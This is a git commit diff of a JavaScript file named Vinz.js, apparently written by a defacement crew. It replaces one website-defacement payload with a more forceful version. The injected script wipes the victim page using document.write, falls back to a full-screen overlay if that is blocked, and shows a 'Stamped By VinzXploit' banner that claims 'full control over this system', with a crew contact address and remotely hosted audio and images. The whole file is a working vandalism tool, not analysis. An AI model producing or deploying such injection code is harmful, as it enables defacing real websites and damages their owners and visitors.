182959402d970befd87bf0bce575181112dfb997
VinzSec1337 <vinzroot128@gmail.com>
2026-04-04 02:20:18 +0700

    Vinz.js

--- Vinz.js
+++ Vinz.js
@@ -1,59 +1,22 @@
-/* [ VINZXPLOIT OMEGA JSO - FULL INDEX V3 ] 
-   Vibes: Total Wipeout & Hijack
+/* [ VINZXPLOIT GOD MODE - TOTAL OVERWRITE ] 
+   Vibes: Nuclear Option for Full Index
 */
 
 (function() {
-    var defaceContent = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Stamped By VinzXploit</title>
-    <link rel="icon" type="image/jpg" href="https://i.ibb.co.com/QcXSv2J/ceslogo.jpg">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans+Narrow|Just+Another+Hand" />
-<style>
-    /* CSS RESET BIAR KAGA TABRAKAN */
-    html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: black !important; }
-    body { text-align: center; }
-    @keyframes shake {
-        0% { transform: translate(1px, 1px) rotate(0deg); }
-        10% { transform: translate(-1px, -2px) rotate(-1deg); }
-        20% { transform: translate(-3px, 0px) rotate(1deg); }
-        30% { transform: translate(3px, 2px) rotate(0deg); }
-        40% { transform: translate(1px, -1px) rotate(1deg); }
-        50% { transform: translate(-1px, 2px) rotate(-1deg); }
-        60% { transform: translate(-3px, 1px) rotate(0deg); }
-        70% { transform: translate(3px, 1px) rotate(-1deg); }
-        80% { transform: translate(-1px, -1px) rotate(1deg); }
-        90% { transform: translate(1px, 2px) rotate(0deg); }
-        100% { transform: translate(1px, -2px) rotate(-1deg); }
-    }
-    .x { animation: shake 5s infinite; font-family: 'Just Another Hand', cursive; font-size: 58px; color: white; margin-top: 50px; }
-    .z { font-family: 'PT Sans Narrow', cursive; font-size: 18px; color: white; line-height: 1.6; }
-    img { margin-top: 50px; border-radius: 10px; border: 2px solid white; }
-</style>
-</head>
-<body onclick="var x=document.getElementById('sec'); x.play();">
-    <audio id="sec" loop><source src="https://l.top4top.io/m_33163rb1j0.mp3" type="audio/mpeg"></audio>
-    <img src="https://i.ibb.co.com/QcXSv2J/ceslogo.jpg" width="250"> 
-    <div class="x">&#8361; Stamped By VinzXploit &#8361;</div><br>
-    <div class="z">
-        <i><strong>We have full control over this system...</strong></i><br><br> 
-        Contact: JabarCrime@protonmail.com<br><br> 
-        <strong>CYBER ERROR SYSTEM WAS HERE</strong><br>
-        Fakesite - Doys_404 - Anon_lx02 - Fakesec - Iethesia - SukaKamu01 - VinzXploit - ./GregCyber
-    </div>
-</body>
-</html>
-    `;
+    var defaceHTML = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Stamped By VinzXploit</title><link rel="icon" type="image/jpg" href="https://i.ibb.co.com/QcXSv2J/ceslogo.jpg"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans+Narrow|Just+Another+Hand" /><style>html, body { background: black !important; color: white !important; margin: 0; padding: 0; width: 100vw; height: 100vh; overflow: hidden; position: fixed; top: 0; left: 0; z-index: 999999; } body { text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; } @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } } .x { animation: shake 5s infinite; font-family: 'Just Another Hand', cursive; font-size: 58px; } .z { font-family: 'PT Sans Narrow', cursive; font-size: 18px; line-height: 1.6; max-width: 80%; } img { width: 250px; border-radius: 10px; border: 2px solid gold; }</style></head><body onclick="document.getElementById('m').play();"><audio id="m" loop><source src="https://l.top4top.io/m_33163rb1j0.mp3" type="audio/mpeg"></audio><img src="https://i.ibb.co.com/QcXSv2J/ceslogo.jpg"><div class="x">&#8361; Stamped By VinzXploit &#8361;</div><br><div class="z"><i><strong>We have full control over this system...</strong></i><br><br>Contact: JabarCrime@protonmail.com<br><br><strong>CYBER ERROR SYSTEM WAS HERE</strong><br>VinzXploit - Cyber Error System</div></body></html>`;
 
-    // TEKNIK FULL OVERWRITE BRUTAL
-    document.documentElement.innerHTML = defaceContent;
-    
-    // Kadang body aslinya masih punya class/style yang ngganggu, kita hajar paksa:
-    document.body.removeAttribute("class");
-    document.body.removeAttribute("style");
-    document.body.style.backgroundColor = "black";
-    
-    console.log("Full Index Success - VinzXploit");
+    // TEKNIK HIJACK PAKSA (NUKLIR)
+    try {
+        // Hajar Root
+        document.open("text/html", "replace");
+        document.write(defaceHTML);
+        document.close();
+    } catch (e) {
+        // Fallback kalau document.write diblokir: Pakai Fixed Overlay
+        var fullSc = document.createElement('div');
+        fullSc.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:black; z-index:999999; overflow:auto;";
+        fullSc.innerHTML = defaceHTML;
+        document.body.appendChild(fullSc);
+        document.body.style.overflow = "hidden";
+    }
 })();
